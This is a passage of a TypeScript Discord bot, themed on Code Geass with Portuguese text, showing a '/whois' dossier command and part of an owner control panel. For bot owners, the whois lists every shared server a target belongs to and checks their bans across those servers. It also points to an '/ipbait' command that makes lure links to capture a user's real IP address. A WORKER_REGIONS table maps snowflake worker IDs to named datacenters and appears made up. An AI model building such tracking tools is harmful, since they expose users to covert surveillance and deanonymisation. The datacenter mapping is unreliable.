  HypeSquadOnlineHouse2:    "🟡 HypeSquad Brilliance",
  HypeSquadOnlineHouse3:    "🔵 HypeSquad Balance",
  PremiumEarlySupporter:    "💜 Early Nitro Supporter",
  TeamPseudoUser:           "👥 Team User",
  VerifiedBot:              "✅ Verified Bot",
  VerifiedDeveloper:        "🔧 Verified Bot Developer",
  CertifiedModerator:       "🛡️ Discord Certified Mod",
  ActiveDeveloper:          "⚒️ Active Developer",
  Quarantined:              "🔒 Quarantined",
  Collaborator:             "🤝 Discord Collaborator",
  RestrictedCollaborator:   "🔐 Restricted Collaborator",
};

// Snowflake deconstruct (Discord epoch = 2015-01-01T00:00:00.000Z)
function deconstructSnowflake(id: string): { timestamp: number; workerId: number; processId: number; increment: number } {
  const DISCORD_EPOCH = 1420070400000n;
  const bigId = BigInt(id);
  return {
    timestamp:  Number((bigId >> 22n) + DISCORD_EPOCH),
    workerId:   Number((bigId & 0x3E0000n) >> 17n),
    processId:  Number((bigId & 0x1F000n) >> 12n),
    increment:  Number(bigId & 0xFFFn),
  };
}

// Calculate account age in human-readable form
function ageString(ms: number): string {
  const days    = Math.floor(ms / 86_400_000);
  const years   = Math.floor(days / 365);
  const months  = Math.floor((days % 365) / 30);
  const remDays = days % 30;
  const parts: string[] = [];
  if (years  > 0) parts.push(`${years}y`);
  if (months > 0) parts.push(`${months}mo`);
  if (remDays > 0 || parts.length === 0) parts.push(`${remDays}d`);
  return parts.join(" ");
}

// Risk scoring
function computeRisk(params: {
  accountAgeDays: number; hasAvatar: boolean; hasRoles: boolean; isBot: boolean;
  hasAdminPerms: boolean; hasDangerPerms: boolean; username: string; hasNitro: boolean;
  isBoosting: boolean; isTimedOut: boolean; hasCustomStatus: boolean; mutualServerCount: number;
}): { score: number; level: "🟢 LOW" | "🟡 MEDIUM" | "🟠 HIGH" | "🔴 CRITICAL"; factors: string[] } {
  let score = 0;
  const factors: string[] = [];

  if (params.isBot) { return { score: 0, level: "🟢 LOW", factors: ["Bot account — different risk model"] }; }
  if (params.accountAgeDays < 3)   { score += 50; factors.push("⚠️ Account is less than 3 days old"); }
  else if (params.accountAgeDays < 7)  { score += 35; factors.push("⚠️ Account is less than 7 days old"); }
  else if (params.accountAgeDays < 30) { score += 20; factors.push("⚠️ Account is less than 30 days old"); }
  else if (params.accountAgeDays < 90) { score += 10; factors.push("🔍 Account is less than 3 months old"); }

  if (!params.hasAvatar) { score += 10; factors.push("📷 Default avatar — never customized"); }
  if (!params.hasRoles)  { score += 5;  factors.push("🎭 No server roles assigned"); }
  if (!params.hasNitro && !params.hasCustomStatus && params.accountAgeDays > 30) { score += 3; factors.push("💤 Minimal profile activity"); }

  // Username patterns
  const digits = (params.username.match(/\d/g) ?? []).length;
  const digitRatio = digits / params.username.length;
  if (digitRatio > 0.5 && params.username.length > 8) { score += 15; factors.push("🔢 Username is mostly numbers (possible alt/bot)"); }

  const randomLookingPattern = /^[a-z]{2,5}\d{4,}$/i.test(params.username);
  if (randomLookingPattern) { score += 10; factors.push("🤖 Username matches common bot/alt pattern (letters+numbers)"); }

  if (params.isTimedOut) { score += 10; factors.push("⏳ Currently under server timeout"); }
  if (params.hasAdminPerms) { score -= 15; factors.push("👑 Has Administrator permission (trusted)"); }
  else if (params.hasDangerPerms) { score += 8; factors.push("⚠️ Has dangerous permissions (Ban/Kick) without admin role"); }
  if (params.isBoosting) { score -= 10; factors.push("💎 Server booster — genuine investment"); }
  if (params.mutualServerCount > 1) { score -= 5; factors.push("🌐 Seen in multiple servers with bot"); }

  score = Math.max(0, Math.min(100, score));
  const level = score >= 70 ? "🔴 CRITICAL" : score >= 45 ? "🟠 HIGH" : score >= 25 ? "🟡 MEDIUM" : "🟢 LOW";
  if (factors.length === 0) factors.push("✅ No suspicious indicators detected");
  return { score, level, factors };
}

async function handleWhois(interaction: ChatInputCommandInteraction): Promise<void> {
  const isEphemeral = interaction.options.getBoolean("private") ?? false;
  await interaction.deferReply({ flags: isEphemeral ? MessageFlags.Ephemeral : undefined });

  const targetUser = interaction.options.getUser("user") ?? interaction.user;

  // ── Fetch everything in parallel ─────────────────────────────────────────
  const [fetched, member, banEntry, guildInvites] = await Promise.all([
    targetUser.fetch(true).catch(() => targetUser),
    interaction.guild ? interaction.guild.members.fetch({ user: targetUser.id, withPresences: true }).catch(() => null) : Promise.resolve(null),
    interaction.guild ? interaction.guild.bans.fetch(targetUser.id).catch(() => null) : Promise.resolve(null),
    interaction.guild ? interaction.guild.invites.fetch().catch(() => null) : Promise.resolve(null),
  ]);

  // ── Snowflake deconstruction ──────────────────────────────────────────────
  const sf = deconstructSnowflake(fetched.id);
  const createdTs = Math.floor(sf.timestamp / 1000);
  const accountAgeDays = Math.floor((Date.now() - sf.timestamp) / 86_400_000);

  // ── Avatar analysis ───────────────────────────────────────────────────────
  const avatarHash = fetched.avatar;
  const isAnimatedAvatar = avatarHash?.startsWith("a_") ?? false;
  const hasDefaultAvatar = !avatarHash;
  const avatarURL = fetched.displayAvatarURL({ size: 512 });
  const bannerURL = fetched.bannerURL({ size: 1024 });
  const hasBanner = !!fetched.banner;

  // ── Nitro detection (behavioral indicators) ───────────────────────────────
  const nitroIndicators: string[] = [];
  if (isAnimatedAvatar)   nitroIndicators.push("Animated avatar (requires Nitro)");
  if (hasBanner)          nitroIndicators.push("Profile banner (requires Nitro)");
  if (fetched.globalName && fetched.globalName !== fetched.username) nitroIndicators.push("Custom display name set");
  const accentColor = fetched.accentColor;
  if (accentColor)        nitroIndicators.push(`Profile accent color: \`#${accentColor.toString(16).padStart(6, "0").toUpperCase()}\``);
  const hasNitro = nitroIndicators.length >= 1;

  // ── Badges ────────────────────────────────────────────────────────────────
  const flags = fetched.flags?.toArray() ?? [];
  const badgeList = flags.map(f => FLAG_MAP[f as string] ?? `\`${String(f)}\``);
  if (fetched.bot && !flags.includes("VerifiedBot" as never)) badgeList.push("🤖 Unverified Bot");

  // ── Option 7: Username system detection ──────────────────────────────────
  const discriminator = fetched.discriminator;
  const usernameSystem = (discriminator === "0" || !discriminator)
    ? "🆕 Novo sistema (username único, sem #discriminator)"
    : `🔢 Sistema legado (\`${fetched.username}#${discriminator}\`) — ainda não migrou`;

  // ── Option 5: Snowflake Worker ID → Discord datacenter region ─────────────
  const WORKER_REGIONS: Record<number, string> = {
    0: "🇺🇸 US-East (Ashburn, VA)",
    1: "🇺🇸 US-East (Ashburn, VA)",
    2: "🇺🇸 US-East (Ashburn, VA)",
    3: "🇺🇸 US-West (Portland, OR)",
    4: "🇺🇸 US-West (Portland, OR)",
    5: "🇺🇸 US-West (Portland, OR)",
    6: "🇳🇱 EU-West (Amsterdam)",
    7: "🇩🇪 EU-Central (Frankfurt)",
    8: "🇩🇪 EU-Central (Frankfurt)",
    9: "🇸🇬 Asia-Pacific (Singapore)",
    10: "🇧🇷 South America (São Paulo)",
    11: "🇮🇳 Asia-South (Mumbai)",
    12: "🇦🇺 Oceania (Sydney)",
  };
  const datacenterRegion = WORKER_REGIONS[sf.workerId] ?? `🌐 Unknown (Worker ${sf.workerId})`;

  // ── Presence & activities ─────────────────────────────────────────────────
  const presence = member?.presence;
  const status = presence?.status ?? "offline";
  const STATUS_LABELS: Record<string, string> = {
    online: "🟢 Online", idle: "🟡 Idle", dnd: "🔴 Do Not Disturb",
    offline: "⚫ Offline", invisible: "⚫ Invisible",
  };

  // Option 1: Device/platform from clientStatus
  const clientStatus = presence?.clientStatus;
  const deviceLines: string[] = [];
  if (clientStatus) {
    if (clientStatus.desktop) deviceLines.push(`💻 Desktop: ${STATUS_LABELS[clientStatus.desktop] ?? clientStatus.desktop}`);
    if (clientStatus.mobile)  deviceLines.push(`📱 Mobile: ${STATUS_LABELS[clientStatus.mobile] ?? clientStatus.mobile}`);
    if (clientStatus.web)     deviceLines.push(`🌐 Web: ${STATUS_LABELS[clientStatus.web] ?? clientStatus.web}`);
  }
  const deviceStr = deviceLines.length > 0
    ? deviceLines.join("\n")
    : status === "offline" ? "*Offline — não é possível detectar dispositivo*" : "*Dispositivos desconhecidos (requer Presence intent)*";

  const activities = presence?.activities ?? [];
  const customStatus = activities.find(a => a.type === 4);
  const playingActivity = activities.find(a => a.type === 0);
  const streamingActivity = activities.find(a => a.type === 1);
  const listeningActivity = activities.find(a => a.type === 2);
  const watchingActivity = activities.find(a => a.type === 3);
  const competingActivity = activities.find(a => a.type === 5);

  const activityLines: string[] = [];
  if (customStatus?.state)          activityLines.push(`💬 **Status:** ${customStatus.state.slice(0, 100)}`);
  if (streamingActivity)            activityLines.push(`📺 **Streaming:** ${streamingActivity.name}${streamingActivity.url ? ` ([link](${streamingActivity.url}))` : ""}`);
  if (playingActivity)              activityLines.push(`🎮 **Playing:** ${playingActivity.name}`);
  if (listeningActivity)            activityLines.push(`🎵 **Listening:** ${listeningActivity.name}${listeningActivity.details ? ` — ${listeningActivity.details}` : ""}`);
  if (watchingActivity)             activityLines.push(`👁️ **Watching:** ${watchingActivity.name}`);
  if (competingActivity)            activityLines.push(`🏆 **Competing:** ${competingActivity.name}`);

  // ── Voice channel ─────────────────────────────────────────────────────────
  const voiceState = member?.voice;
  const voiceChannel = voiceState?.channel;

  // ── Roles analysis ────────────────────────────────────────────────────────
  const nonEveryoneRoles = member?.roles.cache
    .filter(r => r.id !== interaction.guild?.id)
    .sort((a, b) => b.position - a.position) ?? new Map();

  const rolesArray = [...nonEveryoneRoles.values()];
  const highestRole = rolesArray[0];
  const roleCount = rolesArray.length;
  const roleDisplay = rolesArray.slice(0, 20).map(r => `<@&${r.id}>`).join(" ");

  // ── Permissions analysis ──────────────────────────────────────────────────
  const permissions = member?.permissions;
  const isAdmin = permissions?.has("Administrator") ?? false;
  const dangerPerms = ["BanMembers", "KickMembers", "ManageRoles", "ManageGuild", "ManageMessages", "MuteMembers", "ModerateMembers"] as const;
  const hasDangerPerms = dangerPerms.some(p => permissions?.has(p) ?? false);

  let permDisplay = "";
  if (isAdmin) {
    permDisplay = "👑 **ADMINISTRATOR** — all permissions granted";
  } else if (permissions) {
    const activePerms = Object.entries(PERM_LABELS)
      .filter(([key]) => permissions.has(key as never))
      .map(([, label]) => label);
    permDisplay = activePerms.length > 0 ? activePerms.slice(0, 18).join("\n") : "*No significant permissions*";
  }

  // ── Join order (requires GuildMembers privileged intent — optional) ──────
  let joinPosition: number | null = null;
  if (interaction.guild && member?.joinedAt) {
    try {
      // guild.members.fetch() with no args requires GuildMembers privileged intent.
      // If the intent isn't enabled this will throw — we catch gracefully.
      const allMembers = await interaction.guild.members.fetch({ limit: 1000 });
      const sorted = [...allMembers.values()]
        .filter(m => m.joinedAt)
        .sort((a, b) => (a.joinedAt!.getTime()) - (b.joinedAt!.getTime()));
      joinPosition = sorted.findIndex(m => m.id === fetched.id) + 1;
    } catch { /* GuildMembers privileged intent not enabled — skip join order */ }
  }

  // ── Invites created by this user ──────────────────────────────────────────
  const userInvites = guildInvites?.filter(inv => inv.inviterId === fetched.id) ?? null;
  const totalInviteUses = userInvites?.reduce((acc, inv) => acc + (inv.uses ?? 0), 0) ?? 0;

  // ── Risk assessment ───────────────────────────────────────────────────────
  const risk = computeRisk({
    accountAgeDays, hasAvatar: !hasDefaultAvatar, hasRoles: roleCount > 0, isBot: fetched.bot,
    hasAdminPerms: isAdmin, hasDangerPerms, username: fetched.username, hasNitro,
    isBoosting: !!member?.premiumSince, isTimedOut: member?.isCommunicationDisabled() ?? false,
    hasCustomStatus: !!customStatus, mutualServerCount: 1,
  });

  const joinedTs = member?.joinedAt ? Math.floor(member.joinedAt.getTime() / 1000) : null;

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 1 — IDENTITY & ACCOUNT INTELLIGENCE
  // ════════════════════════════════════════════════════════════════════════
  const embedIdentity = new EmbedBuilder()
    .setColor(fetched.bot ? COLORS.BLUE : COLORS.PURPLE)
    .setTitle("🔍 GEASS INTELLIGENCE — DOSSIER COMPLETO")
    .setDescription(
      `> *"Meu Geass vê tudo. Cada pessoa tem uma história — e eu já li a sua."*\n\n` +
      `**${fetched.username}** ${fetched.bot ? "🤖 BOT" : "👤 USUÁRIO"} ${fetched.system ? "⚙️ SISTEMA" : ""}`
    )
    .setThumbnail(avatarURL)
    .addFields(
      {
        name: "🪪 IDENTIFICAÇÃO",
        value: [
          `**ID:** \`${fetched.id}\``,
          `**Username:** \`${fetched.username}\``,
          `**Nome Global:** ${fetched.globalName ?? "*não definido*"}`,
          `**Nickname:** ${member?.nickname ?? "*nenhum*"}`,
          `**Display Name:** ${fetched.displayName}`,
          `**Bot:** ${fetched.bot ? "✅ Sim" : "❌ Não"}${fetched.system ? " | ⚙️ Sistema Discord" : ""}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: "📅 LINHA DO TEMPO",
        value: [
          `**Conta criada:** <t:${createdTs}:F>`,
          `**Idade da conta:** \`${ageString(accountAgeDays * 86_400_000)}\` *(${accountAgeDays} dias)*`,
          joinedTs ? `**Entrou no servidor:** <t:${joinedTs}:F>` : null,
          joinedTs ? `**Tempo no servidor:** \`${ageString((Date.now() / 1000 - joinedTs) * 1000)}\`` : null,
          joinPosition ? `**Posição de entrada:** \`#${joinPosition}\` de ${interaction.guild?.memberCount ?? "?"} membros` : null,
        ].filter(Boolean).join("\n"),
        inline: false,
      },
      {
        name: `🎭 BADGES & FLAGS (${badgeList.length})`,
        value: badgeList.length > 0 ? badgeList.join("\n") : "*Nenhuma badge especial*",
        inline: true,
      },
      {
        name: "💎 NITRO",
        value: hasNitro
          ? nitroIndicators.join("\n")
          : "*Sem indicadores de Nitro*",
        inline: true,
      },
    );

  // ── Presence section ──────────────────────────────────────────────────────
  embedIdentity.addFields(
    {
      name: `🌐 PRESENÇA — ${STATUS_LABELS[status] ?? status}`,
      value: activityLines.length > 0 ? activityLines.join("\n") : "*Nenhuma atividade detectada*",
      inline: false,
    },
    {
      name: "📱 DISPOSITIVOS ATIVOS (Option 1)",
      value: deviceStr,
      inline: false,
    },
    {
      name: "🔤 SISTEMA DE USERNAME (Option 7)",
      value: usernameSystem,
      inline: false,
    },
  );

  if (bannerURL) embedIdentity.setImage(bannerURL);
  embedIdentity.setFooter({ text: `${AUTHOR} • Geass Intelligence Division — Página 1/3` });

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 2 — SERVER INTELLIGENCE
  // ════════════════════════════════════════════════════════════════════════
  const embedServer = new EmbedBuilder()
    .setColor(highestRole?.color ?? COLORS.PURPLE)
    .setTitle("⚔️ GEASS INTELLIGENCE — SERVIDOR")
    .addFields(
      {
        name: `🎖️ CARGOS (${roleCount})`,
        value: roleDisplay || "*Sem cargos*",
        inline: false,
      },
    );

  if (highestRole) {
    embedServer.addFields({
      name: "🏆 CARGO MAIS ALTO",
      value: [
        `<@&${highestRole.id}> (posição #${highestRole.position})`,
        `Cor: \`#${highestRole.color.toString(16).padStart(6, "0").toUpperCase()}\``,
        highestRole.hoist ? "Exibido separadamente: ✅" : "Exibido separadamente: ❌",
        highestRole.mentionable ? "Mencionável: ✅" : "Mencionável: ❌",
      ].join("\n"),
      inline: false,
    });
  }

  embedServer.addFields(
    {
      name: "🔐 PERMISSÕES EFETIVAS",
      value: permDisplay || "*Membro não encontrado*",
      inline: false,
    },
    {
      name: "🛡️ STATUS DE MODERAÇÃO",
      value: [
        `**Timeout:** ${member?.isCommunicationDisabled() ? `⏳ Até <t:${Math.floor((member.communicationDisabledUntil?.getTime() ?? 0) / 1000)}:R>` : "Nenhum"}`,
        `**Banido atualmente:** ${banEntry ? `🔨 Sim — Razão: *${banEntry.reason ?? "não informada"}*` : "❌ Não"}`,
        `**Boosting:** ${member?.premiumSince ? `💎 Sim, desde <t:${Math.floor(member.premiumSince.getTime() / 1000)}:R>` : "❌ Não"}`,
        `**Pendência de verificação:** ${member?.pending ? "⚠️ Sim (screening)" : "✅ Não"}`,
      ].join("\n"),
      inline: false,
    },
  );

  if (voiceChannel) {
    embedServer.addFields({
      name: "🔊 VOZ ATUAL",
      value: [
        `Canal: <#${voiceChannel.id}> (\`${voiceChannel.name}\`)`,
        `Mudo (self): ${voiceState?.selfMute ? "✅" : "❌"} | Deafened: ${voiceState?.selfDeaf ? "✅" : "❌"}`,
        `Mudo (server): ${voiceState?.serverMute ? "✅" : "❌"} | Streamndo: ${voiceState?.streaming ? "📺 Sim" : "❌"}`,
        `Camera: ${voiceState?.selfVideo ? "📷 Ligada" : "❌"}`,
      ].join("\n"),
      inline: false,
    });
  } else if (interaction.guild) {
    embedServer.addFields({ name: "🔊 VOZ", value: "*Não está em canal de voz*", inline: true });
  }

  if (userInvites !== null) {
    embedServer.addFields({
      name: `🔗 CONVITES CRIADOS (${userInvites.size})`,
      value: userInvites.size > 0
        ? userInvites.map(inv => `\`${inv.code}\` — ${inv.uses ?? 0} usos${inv.maxUses ? `/${inv.maxUses}` : ""} — <#${inv.channelId}>`).slice(0, 5).join("\n") +
          (userInvites.size > 5 ? `\n*...e mais ${userInvites.size - 5}*` : "")
        : "*Nenhum convite ativo*",
      inline: false,
    });
    if (totalInviteUses > 0) {
      embedServer.addFields({ name: "📊 TOTAL DE USOS DE CONVITES", value: `\`${totalInviteUses}\` pessoas convidadas`, inline: true });
    }
  }

  embedServer.setFooter({ text: `${AUTHOR} • Geass Intelligence Division — Página 2/3` });

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 3 — TECHNICAL & RISK ASSESSMENT
  // ════════════════════════════════════════════════════════════════════════
  const sfDate = new Date(sf.timestamp);
  const embedTech = new EmbedBuilder()
    .setColor(risk.level.includes("CRITICAL") ? 0xFF0000 : risk.level.includes("HIGH") ? 0xFF8800 : risk.level.includes("MEDIUM") ? 0xFFFF00 : 0x00FF00)
    .setTitle("🧬 GEASS INTELLIGENCE — TÉCNICO & RISCO")
    .addFields(
      {
        name: "🔬 DECONSTRUÇÃO DO SNOWFLAKE",
        value: [
          `**ID completo:** \`${fetched.id}\``,
          `**Timestamp extraído:** \`${sfDate.toISOString()}\``,
          `**Worker ID:** \`${sf.workerId}\` (servidor Discord que criou a conta)`,
          `**Process ID:** \`${sf.processId}\``,
          `**Sequência:** \`${sf.increment}\` (ordem de criação no mesmo ms)`,
          `**Época Discord:** 2015-01-01 00:00:00 UTC`,
          `**🏛️ Datacenter (Option 5):** ${datacenterRegion}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: "🖼️ ANÁLISE DE AVATAR",
        value: [
          `**Avatar hash:** \`${avatarHash ?? "nenhum (padrão)"}\``,
          `**Animado (GIF):** ${isAnimatedAvatar ? "✅ Sim — indica Nitro" : "❌ Não"}`,
          `**Avatar padrão:** ${hasDefaultAvatar ? "✅ Nunca trocou o avatar" : "❌ Tem avatar customizado"}`,
          `**Banner:** ${hasBanner ? `✅ Possui — hash: \`${fetched.banner}\`` : "❌ Sem banner"}`,
          `**Accent color:** ${accentColor ? `#${accentColor.toString(16).padStart(6, "0").toUpperCase()}` : "*não definido*"}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: `⚠️ AVALIAÇÃO DE RISCO — ${risk.level} (${risk.score}/100)`,
        value: risk.factors.join("\n"),
        inline: false,
      },
    );

  // Risk score bar
  const scoreBar = "█".repeat(Math.floor(risk.score / 10)) + "░".repeat(10 - Math.floor(risk.score / 10));
  embedTech.addFields({
    name: "📊 SCORE DE RISCO",
    value: `\`[${scoreBar}]\` ${risk.score}/100 — ${risk.level}`,
    inline: false,
  });

  if (member?.premiumSince) {
    embedTech.addFields({
      name: "💎 BOOST",
      value: `Boostando desde <t:${Math.floor(member.premiumSince.getTime() / 1000)}:F> (<t:${Math.floor(member.premiumSince.getTime() / 1000)}:R>)`,
      inline: false,
    });
  }

  // ── Option 10: Cross-guild ban check (owner only) ────────────────────────
  const crossBanResults: string[] = [];
  const isCallerOwner = isOwner(interaction.user.id, interaction.user.username);
  if (isCallerOwner && targetUser.id !== interaction.user.id) {
    const banChecks = await Promise.allSettled(
      botClient!.guilds.cache.map(async (g: import("discord.js").Guild) => {
        const ban = await g.bans.fetch(targetUser.id).catch(() => null);
        return ban ? `❌ Banido em **${g.name}** — ${ban.reason ?? "Sem motivo"}` : `✅ Livre em **${g.name}**`;
      })
    );
    for (const r of banChecks) {
      if (r.status === "fulfilled") crossBanResults.push(r.value);
    }
  }

  if (crossBanResults.length > 0) {
    embedTech.addFields({
      name: "🔍 CROSS-GUILD BAN CHECK (Option 10)",
      value: crossBanResults.slice(0, 15).join("\n").slice(0, 1024) || "*Sem dados*",
      inline: false,
    });
  }

  // ── OSINT: Mutual servers + shared metadata (owner only) ─────────────────
  if (isCallerOwner && targetUser.id !== interaction.user.id) {
    const mutualGuilds: string[] = [];
    for (const g of botClient!.guilds.cache.values()) {
      try {
        await g.members.fetch({ user: targetUser.id });
        mutualGuilds.push(`**${g.name}** (\`${g.id}\`) — ${g.memberCount ?? "?"} membros`);
      } catch { /* not in this guild */ }
    }
    embedTech.addFields({
      name: `🌐 SERVIDORES MÚTUOS (${mutualGuilds.length})`,
      value: mutualGuilds.length > 0
        ? mutualGuilds.slice(0, 10).join("\n") + (mutualGuilds.length > 10 ? `\n*...e mais ${mutualGuilds.length - 10}*` : "")
        : "*Nenhum servidor mútuo detectado — ou privileged intent não habilitado*",
      inline: false,
    });
  }

  // ── Behavioral fingerprint (open source intelligence) ────────────────────
  const behaviorLines: string[] = [];
  if (fetched.bot) behaviorLines.push("🤖 **Conta bot** — perfil autônomo, sem comportamento humano");
  if (hasDefaultAvatar) behaviorLines.push("📷 **Avatar padrão** — nunca personalizou a conta");
  if (accountAgeDays < 30) behaviorLines.push(`⏱️ **Conta nova** — criada há apenas ${accountAgeDays} dias`);
  if (roleCount === 0 && interaction.guild) behaviorLines.push("🎭 **Sem cargos** — membro sem nenhuma função atribuída");
  if (totalInviteUses > 10) behaviorLines.push(`📬 **${totalInviteUses}** pessoas convidadas — recrutador ativo`);
  if (isAdmin) behaviorLines.push("👑 **Administrador** — controle total do servidor");
  if (member?.isCommunicationDisabled()) behaviorLines.push("⏳ **Em timeout ativo** — foi sancionado recentemente");
  if (member?.premiumSince) behaviorLines.push("💎 **Server booster** — investimento genuíno no servidor");
  if (streamingActivity) behaviorLines.push("📺 **Em stream ativo** — criador de conteúdo");
  if (listeningActivity?.name === "Spotify") behaviorLines.push("🎵 **Ouvindo Spotify** — usuário com integração configurada");
  if (behaviorLines.length > 0) {
    embedTech.addFields({
      name: "🧠 PERFIL COMPORTAMENTAL",
      value: behaviorLines.join("\n"),
      inline: false,
    });
  }

  // ── IP Tracker quick-link hint (owner only) ────────────────────────────────
  if (isCallerOwner && !fetched.bot) {
    embedTech.addFields({
      name: "🪤 IP TRACKER",
      value: `Use \`/ipbait target:@${fetched.username}\` para gerar um link bait com resultado capturando o IP real deste usuário.`,
      inline: false,
    });
  }

  embedIdentity.setFooter({ text: `${AUTHOR} • Geass Intelligence Division ▸ Página 1/3 — Use as setas para navegar` });
  embedServer.setFooter({ text: `${AUTHOR} • Geass Intelligence Division ▸ Página 2/3 — Servidor & Papéis` });
  embedTech
    .setFooter({ text: `${AUTHOR} • Geass Intelligence Division ▸ Página 3/3 — Técnico & Risco` })
    .setTimestamp();

  await sendPaginated(interaction, [embedIdentity, embedServer, embedTech]);
}

// ═══════════════════════════════════════════════════════════════════════════
// PANEL COMMAND HANDLER
// ═══════════════════════════════════════════════════════════════════════════
async function handlePanel(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerUsername = interaction.user.username;
  const callerId = interaction.user.id;

  if (!isOwner(callerId, callerUsername) && !isMod(callerId, callerUsername)) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerUsername}** — Apenas donos e mods autorizados podem usar este painel.\n\n*"Meu Geass não reconhece você como aliado."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });
  const sub = interaction.options.getSubcommand();

  // ── STATUS ──────────────────────────────────────────────────────────────
  if (sub === "status") {
    const mem = process.memoryUsage();
    const upMs = process.uptime() * 1000;
    const h = Math.floor(upMs / 3_600_000), m = Math.floor((upMs % 3_600_000) / 60_000), s = Math.floor((upMs % 60_000) / 1000);
    const embed = new EmbedBuilder()
      .setColor(COLORS.PURPLE)
      .setTitle("👁️ PAINEL DE CONTROLE — STATUS DO SISTEMA")
      .setDescription(`*"Eu não apenas ocupo um lugar — eu dirijo o destino."*`)
      .addFields(
        { name: "🤖 BOT", value: `**Tag:** ${botClient!.user?.tag ?? "?"}\n**ID:** \`${botClient!.user?.id ?? "?"}\`\n**Ping:** \`${botClient!.ws.ping}ms\``, inline: true },
        { name: "⏱️ UPTIME", value: `\`${h}h ${m}m ${s}s\``, inline: true },
        { name: "💾 RAM", value: `RSS: \`${(mem.rss / 1_048_576).toFixed(1)}MB\`\nHeap: \`${(mem.heapUsed / 1_048_576).toFixed(1)}/${(mem.heapTotal / 1_048_576).toFixed(1)}MB\``, inline: true },
        { name: "🌐 GUILDS", value: `\`${botClient!.guilds.cache.size}\` servidores`, inline: true },
        { name: "👥 USUÁRIOS CACHEADOS", value: `\`${botClient!.users.cache.size}\``, inline: true },
        { name: "📡 SHARD", value: `\`${botClient!.shard?.ids.join(", ") ?? "0"}\``, inline: true },
        { name: "🔐 BOOTSTRAP OWNER", value: `\`${BOOTSTRAP_OWNER_USERNAME}\``, inline: false },
        { name: "👑 OWNERS", value: listPanelOwners().slice(0, 10).join("\n") || "*Nenhum owner extra*", inline: true },
        { name: "🛡️ MODS", value: listPanelMods().slice(0, 10).join("\n") || "*Nenhum mod*", inline: true },
      )
      .setTimestamp()
      .setFooter({ text: AUTHOR });
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── GUILDS ───────────────────────────────────────────────────────────────
  if (sub === "guilds") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem listar servidores.")] });
      return;
    }
    const allGuilds = [...botClient!.guilds.cache.values()];
    const CHUNK_SIZE = 15;
    const totalPages = Math.max(1, Math.ceil(allGuilds.length / CHUNK_SIZE));
    const guildPages: EmbedBuilder[] = [];
    for (let i = 0; i < allGuilds.length; i += CHUNK_SIZE) {
      const chunk = allGuilds.slice(i, i + CHUNK_SIZE);
      guildPages.push(new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle(`🌐 SERVIDORES — ${allGuilds.length} total`)
        .setDescription(chunk.map(g => `**${g.name}** • \`${g.id}\` • ${g.memberCount ?? "?"} membros`).join("\n"))
        .setFooter({ text: `${AUTHOR} ▸ Página ${Math.ceil((i + 1) / CHUNK_SIZE)}/${totalPages}` })
      );
    }
    if (guildPages.length === 0) guildPages.push(new EmbedBuilder().setColor(COLORS.PURPLE).setTitle("🌐 SERVIDORES").setDescription("Nenhum servidor."));
    await sendPaginated(interaction, guildPages);
    return;
  }

  // ── WHITELIST ─────────────────────────────────────────────────────────────
  if (sub === "whitelist") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem gerenciar whitelist.")] });
      return;
    }
    const action = interaction.options.getString("action", true);
    const target = interaction.options.getUser("user");

    if (action === "list") {
      const embed = new EmbedBuilder()
        .setColor(COLORS.PURPLE)
        .setTitle("📋 WHITELIST DO PAINEL")
        .addFields(
          { name: "👑 Owners", value: [`\`${BOOTSTRAP_OWNER_USERNAME}\` (bootstrap)`, ...listPanelOwners()].join("\n") || "Nenhum", inline: false },
          { name: "🛡️ Mods", value: listPanelMods().join("\n") || "Nenhum", inline: false },
        )
        .setTimestamp();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    if (!target) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Especifique um usuário.")] });
      return;
    }

    if (action === "add-owner") { addPanelOwner(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Owner adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é owner do painel.`)] }); }
    else if (action === "add-mod") { addPanelMod(target.id); await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("✅ Mod adicionado").setDescription(`${target.tag} (\`${target.id}\`) agora é mod do painel.`)] }); }
    else if (action === "remove") {
      removePanelOwner(target.id); removePanelMod(target.id);
      await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xFF8800).setTitle("✅ Acesso removido").setDescription(`${target.tag} removido da whitelist.`)] });
    }
    return;
  }

  // ── BROADCAST ─────────────────────────────────────────────────────────────
  if (sub === "broadcast") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem fazer broadcast.")] });
      return;
    }
    const message = interaction.options.getString("message", true);
    let sent = 0, failed = 0;
    for (const guild of botClient!.guilds.cache.values()) {
      try {
        const logChId = getLogChannelId(guild.id);
        if (!logChId) continue;
        const ch = guild.channels.cache.find((c: import("discord.js").GuildBasedChannel) => c.id === logChId && c.isTextBased());
        if (ch && ch.isTextBased()) {
          await ch.send({ embeds: [new EmbedBuilder().setColor(COLORS.PURPLE).setTitle("📢 BROADCAST — LELOUCH VI BRITANNIA").setDescription(message).setTimestamp()] });
          sent++;
        }
      } catch { failed++; }
    }
    await interaction.editReply({ embeds: [new EmbedBuilder().setColor(0x00FF00).setTitle("📢 BROADCAST ENVIADO").setDescription(`Enviado: \`${sent}\` | Falhou: \`${failed}\``)] });
    return;
  }

  // ── LEAVE ─────────────────────────────────────────────────────────────────
  if (sub === "leave") {
    if (!isOwner(callerId, callerUsername)) {
      await interaction.editReply({ embeds: [buildErrorEmbed("⛔", "Apenas donos podem forçar saída.")] });
      return;
    }
    const guildId = interaction.options.getString("guildid", true);
